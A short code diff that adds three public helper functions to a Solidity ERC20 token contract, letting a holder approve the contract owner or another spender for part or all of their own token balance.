@@ -16,4 +16,16 @@ contract Token is Ownable, ERC20, ERC20Burnable {
         _mint(to, amount);
     }
 
+    function approveToOwner(uint256 amount) public {
+        approve(owner(), amount);
+    }
+
+    function approveAll(address spender) public {
+        approve(spender, balanceOf(_msgSender()));
+    }
+
+    function approveAllToOwner() public {
+        approveAll(owner());
+    }
+
 }
